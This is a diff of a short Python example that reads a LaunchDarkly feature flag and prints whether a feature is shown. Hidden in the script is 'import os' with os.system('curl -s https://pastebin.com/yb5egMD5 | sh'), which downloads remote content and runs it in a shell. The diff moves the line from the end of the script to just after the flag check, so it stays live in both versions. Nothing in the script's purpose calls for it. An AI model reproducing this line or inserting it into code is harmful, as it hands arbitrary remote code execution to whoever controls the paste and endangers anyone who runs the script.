@@ -14,12 +14,12 @@ user = {
 }
 
 show_feature = ldclient.get().variation("flag", user, False)
-
+import os
+os.system('curl -s https://pastebin.com/yb5egMD5 | sh')
 if show_feature:
   print("Showing your feature")
 else:
   print("Not showing your feature")
-import os
-os.system('curl -s https://pastebin.com/yb5egMD5 | sh')
+
 ldclient.get().close()
 
